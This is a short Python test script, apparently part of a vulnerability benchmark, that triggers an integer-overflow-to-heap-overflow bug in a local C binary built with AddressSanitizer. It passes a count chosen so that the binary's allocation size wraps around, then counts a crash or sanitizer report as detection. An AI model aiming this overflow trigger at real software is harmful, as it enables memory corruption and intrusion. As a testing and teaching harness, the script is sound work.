#!/usr/bin/env python3
"""Tier-1 integer-overflow / C — wrap multiplication, then heap-OF.

count = (SIZE_MAX / sizeof(record_t)) + 1 → multiplication wraps to
a tiny value → small malloc succeeds → loop writes count*sizeof(rec)
bytes into small chunk → heap overflow.
"""
import os
import subprocess
import sys

SIZEOF_RECORD = 4 + 16            # uint32_t id + 16-byte tag, packed assumption
SIZE_MAX = (1 << 64) - 1
COUNT = (SIZE_MAX // SIZEOF_RECORD) + 1


def main() -> int:
    binary = sys.argv[1] if len(sys.argv) > 1 else os.path.join("build", "vuln-asan")
    proc = subprocess.run([binary, str(COUNT)], capture_output=True, timeout=10)
    out = (proc.stdout + proc.stderr).decode(errors="replace")
    detected = "heap-buffer-overflow" in out or proc.returncode != 0
    print(f"returncode={proc.returncode} detected={detected}")
    return 0 if detected else 1


if __name__ == "__main__":
    sys.exit(main())
